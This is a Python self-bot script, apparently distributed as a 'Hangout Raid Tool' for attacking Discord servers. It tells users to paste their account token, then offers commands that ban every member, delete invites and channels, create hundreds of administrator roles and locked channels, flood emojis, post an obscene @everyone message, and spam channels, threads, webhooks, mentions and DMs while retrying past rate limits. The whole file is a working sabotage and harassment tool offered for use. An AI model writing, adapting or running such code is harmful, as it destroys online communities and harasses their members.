AGREE = False # If you agree to the below notice, set to True
'''
Copyright 2026 SheikhAndEmir317

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''

'''
Prerequisites: 
Python3
discord.py-self

How to download (windows): win+R, type "cmd" then paste this: py -3 -m pip install -U discord.py-self
'''

token=     "YOUR_TOKEN_HERE"    # Why does this script need this? This is required for any discord automation to work. Without the token, it simply will error. You can check the script and there is simply no line that sends the token anywhere else but to discord. To get your token: Press Ctrl+Shift+I or F12 in discord.com and find the Application tab. In Storage>Local Storage>https://discord.com Filter for token and copy and paste it into the quotes.
message=   """𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫 [.](https://media.discordapp.net/attachments/1412777811348951181/1412778006530887781/IMG_20250806_143732_507.gif?ex=69d2570c&is=69d1058c&hm=68d4958674f9bcd2c8aab4cf8a0175a767a22987215dd75d804945800c21631b&) [.](https://cdn.discordapp.com/attachments/1466530027796692992/1477336500831125574/caption-3.gif?ex=69d288d5&is=69d13755&hm=3cdc73f0aef17c172d5b688814ee7748f636e741c0e2f08fad2b057b7a71810c&) [.](https://files.catbox.moe/nbst1d.gif) [.](https://media.discordapp.net/attachments/1397971641505419326/1398059022137036880/sticker4.gif?width=640&height=524&ex=69d2d86d&is=69d186ed&hm=19a78dc4199c7ee10fc5b9b0fb993b6c86b3d258e9240150f26f644488c51266&) [.](https://cdn.discordapp.com/attachments/1477396465922998327/1477397573374578810/copy_01EB3DDD-AAE5-4972-9D5B-898A894DF286.gif?ex=69d2c1b6&is=69d17036&hm=e6758f7aa7df9a92f8d78570b274092f00c82d13b3bc95222a6c495182e3a8d7&) [.](https://media.discordapp.net/attachments/1258581306095173759/1365137309019934873/bf0ff5a82e471304.gif?ex=69d26371&is=69d111f1&hm=5641d035cadedce106a9f9ac6e767a674b80a558450aff450447420e714b3178&) [.](https://files.catbox.moe/nbst1d.gif) [.](https://cdn.discordapp.com/attachments/1477396465922998327/1477397575870189669/IMG_6263.gif) [.](https://cdn.discordapp.com/attachments/1477396465922998327/1477397573374578810/copy_01EB3DDD-AAE5-4972-9D5B-898A894DF286.gif) [.](https://media.discordapp.net/attachments/1412777811348951181/1412778006530887781/IMG_20250806_143732_507.gif) [.](https://cdn.discordapp.com/attachments/1483849546256748685/1483853518682062878/out_the_hood.gif) [.](https://cdn.discordapp.com/attachments/929408219120537600/1331795315753226320/caption.gif)"""  # This message will be used for the rest of the script. If you are using nuke it is not recommended to have pings in this message.

'''

[Hangout Raid Tool (Permanent Link)](<https://palestinian.has.rocks/Hangout_Raid_Tool.py>)

[Helpful Video Guide](https://palestinian.has.rocks/helpful_guide.mp4)

```Copyright 2026 SheikhAndEmir317

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.```

`Prerequisites: `
[Python3](<https://www.python.org/downloads/>)
How to download (windows): Visit the link above and run the installer once you have download from the website.

[discord.py-self](<https://discordpy-self.readthedocs.io/en/latest/>)
How to download (windows) (assuming Python3 is installed): win+R, type "cmd" then paste this in command prompt:
`py -3 -m pip install -U discord.py-self`

'''

if AGREE == True:
    from discord.ext import commands
    import discord
    import asyncio
    import aiohttp
    import random
    from discord.ext.commands import HelpCommand

    # --- Custom Help Command ---

    COMMAND_META = {
        "nuke": "Full server nuke — deletes channels, bans members, floods roles, recreates channels with locked perms. Usage: `!nuke [tactical: true/false] [role_spam: true/false] [emoji_flood: true/false]`",
        "resetserver": "Undo nuke — restores default channels, unbans all, cleans roles. Usage: `!resetserver [role_spam: true/false]`",
        "spam": "Spam current channel with message payload until `!stop`. Usage: `!spam`",
        "threadspam": "Flood channels with new threads containing payload. Usage: `!threadspam`",
        "chanspam": "Spam every text channel + thread in the server. Usage: `!chanspam [threads: true/false]`",
        "whspam": "Webhook-based channel spam — bypasses user rate limits, persists after kick. Usage: `!whspam`",
        "everyone": "Mass mention all members in chunks. Usage: `!everyone [loop: true/false]`",
        "massdm": "⚠ DO NOT USE ⚠ DM all server members. Usage: `!massdm`",
        "emojiflood": "Fill server emoji slots (up to 250). Usage: `!emojiflood`",
        "stop": "Halt any running spam loop. Usage: `!stop`",
    }

    CATEGORY_MAP = {
        "💣 Nuke": ["nuke", "resetserver"],
        "🚨 Spam": ["spam", "chanspam", "whspam", "everyone", "massdm", "emojiflood"],
        "🛑 Control": ["stop"],
    }

    class CategorizedHelp(HelpCommand):
        def __init__(self):
            super().__init__(
                command_attrs={
                    "help": "Show command list. Usage: `!help [command name]`",
                    "name": "help"
                }
            )

        async def send_bot_help(self, mapping):
            lines = ["**── Commands ──**\n"]
            for cat_name, cmd_names in CATEGORY_MAP.items():
                lines.append(f"**{cat_name}**")
                for name in cmd_names:
                    meta = COMMAND_META.get(name, "")
                    short = meta.split(". Usage:")[0] if ". Usage:" in meta else meta
                    lines.append(f"  `!{name}` — {short}")
                lines.append("")
            await self.get_destination().send("\n".join(lines))

        async def send_command_help(self, command):
            name = command.name
            meta = COMMAND_META.get(name, command.help or "No description.")
            await self.get_destination().send(f"`!{name}` — {meta}")

        async def send_group_help(self, group):
            await self.send_bot_help({})

        async def send_cog_help(self, cog):
            await self.send_bot_help({})

    help_command = CategorizedHelp()

    # --- Bot Setup ---

    client = commands.Bot(command_prefix="!", self_bot=True, help_command=help_command)
    running = True

    # --- Helpers ---

    def to_bool(s):
        return str(s).lower() in ["yes", "on", "1", "true"]

    def truncate(text, max_len=100):
        return text[:max_len]

    def jitter(base, spread=0.15):
        return base + random.uniform(0, spread)

    async def safe_request(coro):
        while True:
            try:
                return await coro
            except discord.HTTPException as e:
                if e.status == 429:
                    wait = (e.retry_after if hasattr(e, 'retry_after') else 5.0) + 0.3
                    await asyncio.sleep(wait)
                else:
                    raise

    async def safe_send(target):
        while running:
            try:
                await safe_request(target.send(message))
            except discord.Forbidden:
                print(f"Forbidden in {getattr(target, 'name', target)}")
                return
            except discord.HTTPException as e:
                if e.status != 429:
                    print(f"HTTP error in {getattr(target, 'name', target)}: {e}")
                    return
            await asyncio.sleep(jitter(0.3))

    async def safe_send_once(target):
        try:
            await safe_request(target.send(message))
            return True
        except discord.Forbidden:
            print(f"Forbidden in {getattr(target, 'name', target)}")
        except discord.HTTPException as e:
            print(f"HTTP error in {getattr(target, 'name', target)}: {e}")
        return False

    async def thread_flood(channel, count=5):
        for _ in range(count):
            try:
                t = await safe_request(channel.create_thread(name=truncate(message, 100), auto_archive_duration=60))
                await t.send(message)
            except:
                pass
            await asyncio.sleep(jitter(0.2))

    async def delete_channels(guild):
        for channel in list(guild.channels):
            try:
                await safe_request(channel.delete())
                await asyncio.sleep(jitter(0.1))
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")

    async def delete_roles(guild):
        for role in guild.roles:
            if role.is_default() or role.position >= guild.me.top_role.position:
                continue
            try:
                await safe_request(role.delete(reason="Resetting..."))
                print(f"Deleted role: {role.name}")
            except discord.Forbidden:
                print(f"Forbidden to delete role: {role.name}")
            except discord.HTTPException as e:
                if e.status != 429:
                    print(f"HTTPException deleting role {role.name}: {e}")

    async def assign_roles(member, roles):
        try:
            await safe_request(member.add_roles(*roles))
        except discord.Forbidden:
            print(f"Forbidden to assign roles to {member}")
        except discord.HTTPException as e:
            print(f"HTTPException assigning roles to {member}: {e}")

    def lock_overwrites(guild):
        return {
            guild.default_role: discord.PermissionOverwrite(
                send_messages=False,
                manage_channels=False,
                manage_permissions=False
            ),
            guild.me: discord.PermissionOverwrite(
                send_messages=True,
                manage_channels=True
            )
        }

    async def threadspam_target(channel, count=5):
        if not channel.permissions_for(channel.guild.me).create_public_threads:
            return
        for _ in range(count):
            if not running:
                break
            try:
                t = await safe_request(channel.create_thread(name=truncate(message, 100), auto_archive_duration=60))
                await t.send(message)
            except:
                pass
            await asyncio.sleep(jitter(0.2))

    # --- Constants ---

    MAX_NAME = 100
    MAX_CHANNELS_PER_CATEGORY = 50
    MAX_TOTAL_CHANNELS = 500
    CONCURRENT_TASKS = 10
    DELETE_EXISTING = True

    # --- Commands ---

    @client.command("stop")
    async def stop(ctx):
        global running
        running = False
        await ctx.send("Stopped.")

    @client.command("spam")
    async def spam(ctx):
        global running
        running = True
        while running:
            await safe_send(ctx)

    @client.command("threadspam")
    async def threadspam(ctx):
        global running
        running = True
        guild = ctx.guild
        if not guild:
            return
        while running:
            for ch in guild.text_channels:
                if not running:
                    break
                await threadspam_target(ch, 5)
            await asyncio.sleep(jitter(0.5))

    @client.command("chanspam")
    async def chanspam(ctx, do_threads: str = "false"):
        global running
        running = True
        guild = ctx.guild
        if not guild:
            return
        thread_spam = to_bool(do_threads)
        while running:
            targets = []
            for ch in guild.channels:
                if isinstance(ch, discord.TextChannel):
                    if ch.permissions_for(guild.me).send_messages:
                        targets.append(ch)
                elif isinstance(ch, discord.ForumChannel):
                    threads = list(ch.threads)
                    try:
                        async for thread in ch.archived_threads(limit=None):
                            threads.append(thread)
                    except discord.Forbidden:
                        pass
                    for thread in threads:
                        if thread.permissions_for(guild.me).send_messages:
                            targets.append(thread)
            for target in targets:
                if not running:
                    break
                await safe_send_once(target)
                if thread_spam and isinstance(target, discord.TextChannel):
                    await threadspam_target(target, 3)
            await asyncio.sleep(jitter(0.5))

    @client.command("whspam")
    async def whspam(ctx):
        global running
        running = True
        guild = ctx.guild
        while running:
            for ch in guild.text_channels:
                if not running:
                    break
                if not ch.permissions_for(guild.me).manage_webhooks:
                    continue
                try:
                    wh = await safe_request(ch.create_webhook(name="x"))
                    await wh.send(message, username=truncate(message, 80))
                    await safe_request(wh.delete())
                except discord.HTTPException as e:
                    if e.status != 429:
                        continue
                await asyncio.sleep(jitter(0.3))

    @client.command("massdm")
    async def massdm(ctx):
        guild = ctx.guild
        if not guild:
            await ctx.send("Guild not found.")
            return
        members = [m for m in guild.members if not m.bot and m.id != client.user.id]
        success, failed, blocked = 0, 0, 0
        progress_msg = await ctx.send(f"Sending... 0/{len(members)}")
        for i, member in enumerate(members):
            try:
                await safe_request(member.send(message))
                success += 1
            except discord.Forbidden:
                blocked += 1
            except discord.HTTPException as e:
                print(f"Failed to DM {member}: {e}")
                failed += 1
            if i % 10 == 0:
                await progress_msg.edit(content=f"Sending... {i+1}/{len(members)}")
            await asyncio.sleep(jitter(1.0, 0.5))
        await progress_msg.edit(content=f"Done. ✅ {success} delivered, 🚫 {blocked} blocked, ❌ {failed} failed.")

    @client.command("everyone")
    async def everyone(ctx, spam: str = "false"):
        global running
        running = True
        guild = ctx.guild
        do_spam = to_bool(spam)
        if not guild:
            await ctx.send("Guild not found. Usage: `!everyone [true/false]`")
            return
        members = [m for m in guild.members if not m.bot and m.id != client.user.id]
        if not members:
            await ctx.send("No members found. Enable members intent.")
            return
        chunks, current = [], ""
        for member in members:
            mention = member.mention + " "
            if len(current) + len(mention) > 2000:
                chunks.append(current.strip())
                current = mention
            else:
                current += mention
        if current:
            chunks.append(current.strip())
        if not chunks:
            await ctx.send("No valid chunks generated.")
            return
        
        async def send_chunk(target, content):
            while running:
                try:
                    await safe_request(target.send(content))
                except discord.Forbidden:
                    print(f"Forbidden in {getattr(target, 'name', target)}")
                    return
                except discord.HTTPException as e:
                    if e.status == 429:
                        wait = (e.retry_after if hasattr(e, 'retry_after') else 5.0) + 0.3
                        await asyncio.sleep(wait)
                        continue
                    print(f"HTTP error: {e}")
                    return
                if not do_spam:
                    return
                await asyncio.sleep(jitter(0.3))
        
        tasks = [send_chunk(ctx, chunk) for chunk in chunks]
        await asyncio.gather(*tasks)

    @client.command("emojiflood")
    async def emojiflood(ctx):
        guild = ctx.guild
        image_url = "https://us-east-1.tixte.net/uploads/palestinian.has.rocks/headles.png"
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status != 200:
                    await ctx.send("Failed to fetch image for emoji.")
                    return
                img = await resp.read()
        count = 0
        for i in range(250):
            try:
                await safe_request(guild.create_custom_emoji(name=f"n{i}", image=img))
                count += 1
                await asyncio.sleep(jitter(0.8, 0.3))
            except discord.HTTPException as e:
                if "Maximum number of emojis" in str(e):
                    break
                if e.status != 429:
                    print(f"Emoji error: {e}")
        await ctx.send(f"Created {count} emojis.")

    async def create_channel(guild, category, name, semaphore, overwrites):
        async with semaphore:
            try:
                await safe_request(guild.create_text_channel(name=name, category=category, overwrites=overwrites))
                await asyncio.sleep(jitter(0.25))
            except Exception as e:
                print(f"Failed to create channel: {e}")

    @client.command("nuke")
    async def nuke(ctx, tactical_nuke: str = "true", role_spam: str = "false", emoji_flood: str = "false"):
        guild = ctx.guild
        invites = await guild.invites()
        tactical_nuke = to_bool(tactical_nuke)
        do_role_spam = to_bool(role_spam)
        do_emoji = to_bool(emoji_flood)
        overwrites = lock_overwrites(guild)

        async with aiohttp.ClientSession() as session:
            async with session.get("https://us-east-1.tixte.net/uploads/palestinian.has.rocks/nuked.png") as resp:
                if resp.status != 200:
                    await ctx.send("Failed to fetch icon.")
                    return
                icon_bytes = await resp.read()

            emoji_img = None
            if do_emoji:
                emoji_url = "https://us-east-1.tixte.net/uploads/palestinian.has.rocks/nuked_emoji.png"
                async with session.get(emoji_url) as resp:
                    if resp.status == 200:
                        emoji_img = await resp.read()

        if not tactical_nuke:
            for _ in range(10):
                await ctx.send("||@everyone|| [FUCK THIS SERVER WE NUKING IT LOL](https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831)")
            tactical_nuke = True

        if tactical_nuke:
            try:
                await safe_request(guild.edit(name=truncate(message), description=truncate(message), icon=icon_bytes))
                try:
                    await safe_request(guild.edit(banner=icon_bytes))
                except discord.Forbidden:
                    pass
            except Exception as e:
                await ctx.send(f"Failed to rename server: {e}")

            for invite in invites:
                try:
                    await safe_request(invite.delete(reason=f"Cleared by {ctx.author}"))
                except Exception as e:
                    print(f"Failed to delete invite {invite.code}: {e}")

            members = [m for m in guild.members if not m.bot and m.id != client.user.id]
            roles = []

            if do_role_spam:
                await delete_roles(guild)
                for i in range(250):
                    try:
                        role = await safe_request(guild.create_role(name=truncate(message), permissions=discord.Permissions(administrator=True), colour=discord.Colour.blue(), reason=f"Role created by {ctx.author}"))
                        roles.append(role)
                    except discord.Forbidden:
                        print("Forbidden to create role")
                    except discord.HTTPException as e:
                        if e.status != 429:
                            print(f"HTTPException creating role: {e}")

                await asyncio.gather(*[assign_roles(m, roles) for m in members])

            for member in members:
                try:
                    await safe_request(member.ban(reason="NUKED"))
                    await ctx.send(f"Banned {member} ✅")
                except Exception as e:
                    await ctx.send(f"Failed to ban {member}: {e}")

            if DELETE_EXISTING:
                await delete_channels(guild)

            categories = []
            for i in range(MAX_TOTAL_CHANNELS // MAX_CHANNELS_PER_CATEGORY):
                try:
                    category = await safe_request(guild.create_category(truncate(message)[:100]))
                    categories.append(category)
                except Exception as e:
                    print(f"Failed to create category: {e}")

            if not categories:
                await ctx.send("❌ Failed to create categories.")
                return

            semaphore = asyncio.Semaphore(CONCURRENT_TASKS)
            await asyncio.gather(*[create_channel(guild, categories[i % len(categories)], truncate(message)[:100], semaphore, overwrites) for i in range(MAX_TOTAL_CHANNELS)])

            if do_emoji and emoji_img:
                count = 0
                for i in range(250):
                    try:
                        await safe_request(guild.create_custom_emoji(name=f"n{i}", image=emoji_img))
                        count += 1
                    except discord.HTTPException as e:
                        if "Maximum number of emojis" in str(e):
                            break
                        if e.status != 429:
                            print(f"Emoji error: {e}")
                await ctx.send(f"Created {count} emojis.")

    @client.command("resetserver")
    async def resetserver(ctx, role_spam: str = "false"):
        guild = ctx.guild
        try:
            await safe_request(guild.edit(name=f"{guild.owner.display_name}'s server"))
        except Exception as e:
            await ctx.send(f"Failed to rename server: {e}")

        if to_bool(role_spam):
            await delete_roles(guild)

        for ban in [b async for b in guild.bans(limit=None)]:
            try:
                await safe_request(guild.unban(ban.user, reason=f"Mass unban by {ctx.author}"))
            except Exception as e:
                print(f"Failed to unban {ban.user}: {e}")

        if DELETE_EXISTING:
            await delete_channels(guild)

        try:
            text_cat = await safe_request(guild.create_category("Text Channels"))
            voice_cat = await safe_request(guild.create_category("Voice Channels"))
            await safe_request(guild.create_text_channel("general", category=text_cat))
            await safe_request(guild.create_voice_channel("General", category=voice_cat))
        except Exception:
            pass

        await ctx.send("Server reset.")

    client.run(token)